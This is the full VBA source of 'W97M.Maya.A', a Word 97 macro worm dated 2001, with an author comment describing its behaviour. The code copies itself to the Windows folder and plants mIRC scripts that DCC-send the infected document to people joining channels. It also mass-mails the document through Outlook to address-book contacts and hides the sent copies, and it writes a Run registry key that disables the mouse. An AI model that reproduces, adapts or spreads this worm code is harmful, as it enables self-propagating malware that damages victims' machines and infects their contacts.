' Worm Name : W97M.Maya.A
' Author : PetiK
' Date : May 29th � June 1st 2001
' Size : 33792 � 33280 (with change) bytes
'
'
'
' Change the properties of the documents. If not exist the Value �W97M.Maya� in
' the key HKLM\Software\, the worm copy itself to C:\Windows\Maya.doc. It creates
' the �C:\Maya� directory with a TXT file and a acript file to infect mIRC
' channel. After, it spreads with Microsoft Outlook.
'   Subject :   �Hi man, it�s � + user name
'   Body :  �This is the new net Story�
'           �It 's great�
'   Attachment : Maya.doc
' On 5th of the month, when the document is close, a message box appears.
' When Visual Basic is active, an other message box appears and the worm
' add a value in the �RunKey� of regedit to disabled the mouse.


Sub AutoOpen()
On Error Resume Next

With Dialogs(wdDialogFileSummaryInfo)
.Author = "PetiK"
.Title = "WM97.Maya"
.Comments = "To my best GirlFriend"
.Keywords = "Maya, Bzzbzz, to grow"
.Execute
End With

If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\", "W97M.Maya") <> "Par PetiK" Then

ActiveDocument.SaveAs FileName:="C:\Windows\Maya.doc"
ActiveDocument.Saved = True

FileSystem.MkDir "C:\Maya"
Open "C:\Maya\hello.txt" For Output As #1
Print #1, "Le 29 mai 2001 � Munster"
Print #1, "This is my first W97M.Outlook.Worm"
Print #1, "Its name is W97M.Maya"
Close #1
Open "C:\Maya\script.ini" For Output As #1
Print #1, "n0=on 1:JOIN:#:{"
Print #1, "n1= /if ( $nick == $me ) { halt }"
Print #1, "n2= /.dcc send $nick C:\Windows\Maya.doc"
Print #1, "n3=}"
Close #1
FileSystem.FileCopy "C:\Maya\script.ini", "C:\mirc\script.ini"
FileSystem.FileCopy "C:\Maya\script.ini", "C:\mirc32\script.ini"
FileSystem.FileCopy "C:\Maya\script.ini", "C:\progra~1\mirc\script.ini"
FileSystem.FileCopy "C:\Maya\script.ini", "C:\progra~1\mirc32\script.ini"
FileSystem.Kill "C:\Maya\script.ini"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\", "W97M.Maya") = "Par PetiK"
End If

Dim maya, bzzbzz, petik
Set maya = CreateObject("Outlook.Application")
Set bzzbzz = maya.GetNameSpace("MAPI")
If maya = "Outlook" Then
    bzzbzz.Logon "profile", "password"
    For mayacompte = 1 To bzzbzz.AddressLists.Count
        Set AB = bzzbzz.AddressLists(mayacompte)
        x = 1
        Set petik = maya.CreateItem(0)
        For compte = 1 To AB.AddressEntries.Count
            verif = AB.AddressEntries(x)
            petik.Recipients.Add verif
            x = x + 1
            If x > 500 Then compte = AB.AddressEntries.Count
        Next compte
        petik.Subject = "Hi man, it's " & Application.UserName
        petik.Body = "This is the new net Story" + vbCrLf + "It's great"
        petik.Attachments.Add ActiveDocument.FullName
        petik.DeleteAfterSubmit = True
        petik.Send
        verif = ""
    Next mayacompte
    bzzbzz.Logoff
End If


End Sub

Sub AutoClose()
If Day(Now) = 5 Then
MsgBox "Coded by PetiK (c)2001", vbInformation, "WM97.Maya"
End If
End Sub

Sub ViewVBCode()
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "MayAttack") = "rundll32 mouse,disable"
MsgBox "Curiosity is bad" + vbCr + vbCr + "With her small size" + vbCr + "Maya is alwayas there", vbCritical, "WM97.Maya"
ShowVisualBasicEditor = True
End Sub

